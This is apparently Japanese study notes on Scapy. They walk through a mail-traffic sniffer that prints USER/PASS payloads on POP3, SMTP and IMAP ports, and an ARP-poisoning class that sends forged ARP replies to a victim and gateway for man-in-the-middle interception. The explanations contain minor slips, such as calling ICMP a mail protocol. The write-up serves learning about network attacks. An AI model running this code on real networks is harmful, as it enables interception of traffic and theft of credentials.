# メール関連のパケットをスニッフする

`sniff`関数に与える主な引数は

`filter`：スニッフする際のパケットのフィルター（Berkeley Packet Filterスタイル）
`prn`：目的のパケットを得た際に呼ぶ関数
`count`：スニッフするパケット数（これを指定しないと永遠にスニッフし続ける）
 
`store = 0`は得たパケットをメモリに保存しないようにする指定。

```python
def main():    
    sniff(filter = 'tcp port 110 or tcp port 25 or tcp port 143', \
                      prn = packet_callback, store = 0)
```
メール関連のパケットをスニッフする為に上記のようにフィルターをかける。
 
メール関連のプロトコルとそのプロトコル番号は下表の通り：

- POP3：110番
- IMAP：143番
- SMTP：25番

```python
def packet_callback(packet):    
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")
```
**”データペイロード”**とは、パケットからヘッダ等の付加情報を除いた**”データ本体”**のこと。

POPやICMP等のメール系で使われるコマンドUSERまたはPASSが含まれているか最終チェックしてそれを通過したものは送り先やらデータ内容を表示。

Scapy公式ドキュメント：https://scapy.readthedocs.io/en/latest/usage.html

なぜか分からないけど”IndexError: Layer [TCP] not found”のエラーが出る。調べてみたけどしっくり来る解決法や同じような問題がヒットしない。
自分はMacでやってるけどもしかしたらKaliでは問題ないのかもしれない。

# ScapyでARPポイゾニング

ArpポイゾニングはMITM(Man-In-The-Middle attack)の一種。

ターゲットとゲートウェイのARPテーブルにおけるMACアドレスを書き換える。

本書での構成をイラストで図示するとこんな感じ👇

![arp_poisoning_strcture-1](https://user-images.githubusercontent.com/85237728/182304459-8b56d32b-2ace-485e-b13b-109b1fdcc304.png)

ターゲットおよびゲートウェイのARPテーブルにおいて、MACアドレスがアタッカーのMACアドレスになってしまっている。

ゆえにパケットがアタッカーを経由することになる。

自分のpcで実装するにあたり、パケットの経由を可能にする為パケットフォワーディングを許可しておくこと（ここでは省略する）。

## MACアドレスを求める関数

ARPポイゾニングにはターゲットとゲートウェイのMACアドレスを知る必要がある。
```python
def get_mac(targetip):     
    packet = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op = "who-has", pdst = targetip)
    resp, _ = srp(packet, timeout = 2, retry = 10, verbose = False)
    for _, r in resp:
        return r[Ether].src
    return None
```

引数に与えたIPアドレスに対するMACアドレスを求めて返してくれる。


ScapyのEtherとARPでパケットオブジェクトを作る。

Etherの引数`dst = 'ff:ff:ff:ff:ff:ff'`はブロードキャストの意味。

ARPのpdstで対象としているIPアドレスを持っているか確認。

パケットを送信かつ受信したい時に使えるのがsr関数。

その仲間で、特にLayer2のパケット（Ethernetや802.3など）を扱う関数が今回使っているsrp関数。

srpとrespの中身は次を見てもらえれば分かる：

```python
>>> print(srp(packet, timeout = 2, retry = 10, verbose = False))
(<Results:TCP:0 UDP:0 ICMP:0 Other:1>, <Unanswered:TCP:0 UDP:0 ICMP:0 Other:0>)
>>> resp, _ = srp(packet, timeout = 2, retry = 10, verbose = False)
>>> resp
<Results:TCP:0 UDP:0 ICMP:0 Other:1>
>>> for i in resp:
...:     print(i)
...:
QueryAnswer(query=<Ether dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP op=who-has pdst=192.168.2.1 |>>, answer=<Ether dst=38:f9:d3:66:d6:d8 src=bc:5c:4c:1c:28:1d type=ARP |<ARP 
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=bc:5c:4c:1c:28:1d psrc=192.168.2.1 hwdst=38:f9:d3:66:d6:d8 pdst=192.168.2.105 |>>)
>>> 
```

## Arperクラスのメソッド

Arperクラスのメソッドはそこまで難しくない。

ここでは初期化メソッド、poisonメソッドについてだけ触れる。

### 初期化メソッド
```python
def __init__(self, victim, gateway, interface = 'en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}: ')
        print(f"Gateway ({gateway}) is at {self.gatewaymac}.")
        print(f"Victim ({victim}) is at {self.victimmac}.")
        print('-' * 30)
```

`self.victim`や`self.gateway`には実行時に指定するIPアドレスが入る。

そしてターゲットのMACアドレスが`self.victimmac`、ゲートウェイのMACアドレスが`self.gatewaymac`。

👆特に`victimmac`と`gatewaymac`については後々重要になってくる。

### poisonメソッド

poisonメソッドはポイズンパケットを作って、ターゲットとゲートウェイに送る。

```python
def poison(self):        
        # poisoned ARP packet for the victim
        poison_victim = ARP()
        poison_victim.op = 2  # ARP 応答
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-' * 30)

        # poisoned ARP packet for the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(f'mac dst: {poison_gateway.hwdst}')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
```

ARPパケットのopっていうのはオプションコードのこと：

- 1 → ARP要求
- 2 → ARP応答

```python
sys.stdout.flush()
```

フラッシュといのは、プログラムが終了したにもかかわらずOSのバッファリング（一時的なデータ記憶）により実際には出力されてなかったものを出力させること。

おまけに`wrpcap`についても：

```python
from scapy.all import wrpcap

wrpcap('arper.pcap', packets)
```
キャプチャしたパケット達（`packets`）を`arper.pcap`という名のキャプチャファイルに記録する。

# 疑問点とその解消

初見で俺は次の疑問が湧いた：

どのタイミングでMACアドレス書き換えた？これでARPポイゾニングできてんの？

でも確かに実行してみるとターゲットのARPテーブルが攻撃者のそれに見事書き換えられていた。

ここではその原理を説明する（上の`poison`関数を噛み砕いてゆく）。

`poison`関数一個目のブロック：

```python
# poisoned ARP packet for the victim
        poison_victim = ARP()
        poison_victim.op = 2  # ARP 応答
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-' * 30)
```

これは

gateway → アタッカー → victim

という流れにおけるパケット操作。

つまり

アタッカーから見たvictimに対する毒パケット


一方、ARPポイゾニングとは、MACアドレスをアタッカーのそれに書き換えるものであった（上のイラスト参照。）

そしてコードの次の部分に注目：

```python
# poisoned ARP packet for the victim
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')  # <- キーポイント
        print(f'mac dst: {poison_victim.hwdst}')
```

はて？

`poison_victim.hwsrc`とは何ぞや？

どこで定義してたそんなの？

実はこれがアタッカーのMACアドレス。

これは攻撃者（自分、このスクリプト書いてる人）のMACアドレス。

その証拠として、gatewayのMACアドレスは`gatewaymac`である（初期化メソッドinitで定義済み）。

 

実際、次の画像の通りARPオブジェクトは`hwsrc`属性を持ち、その値はそのスクリプトを書いている人（つまりアタッカー）のMACアドレスとなる。

![hwsrc](https://user-images.githubusercontent.com/85237728/182305160-035c8471-e9a4-4574-8b65-e1bca4316261.jpeg)

まとめると

gateway → アタッカー → victimの流れ
(アタッカーから見たvictimに対する毒パケット)

- 送信元IPアドレス（`poison_victim.psrc`）：ゲートウェイのIPアドスレ
- 宛先IPアドレス（`poison_victim.pdst`）：victimのIPアドレス
- 宛先MACアドレス（`poison_victim.hwdst`）：victimのMACアドレス
- 送信元MACアドレス（`poison_victim.hwsrc`）：アタッカーのMACアドレス

poison関数の二個目のブロックについても同様。

そしてコードの次の部分に注目：

```python
 poisoned ARP packet for the gateway
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src: {poison_gateway.hwsrc}')  # <- キーポイント
        print(f'mac dst: {poison_gateway.hwdst}')
```

これは

victim → アタッカー → gateway

という流れにおけるパケット操作。

つまり

アタッカーから見たgatewayに対する毒パケット

`poison_gateway.hwsrc`がアタッカーのMACアドレス。

これは攻撃者（自分、このスクリプト書いてる人）のMACアドレス。

その証拠として、victimのMACアドレスは`victimmac`である。

まとめると

victim → アタッカー → gatewayの流れ
(アタッカーから見たgatewayに対する毒パケット)

- 送信元IPアドレス（`poison_victim.psrc`）：victimのIPアドスレ
- 宛先IPアドレス（`poison_victim.pdst`）：gatewayのIPアドレス
- 宛先MACアドレス（`poison_victim.hwdst`）：gatewayのMACアドレス
- 送信元MACアドレス（`poison_victim.hwsrc`）：アタッカーのMACアドレス
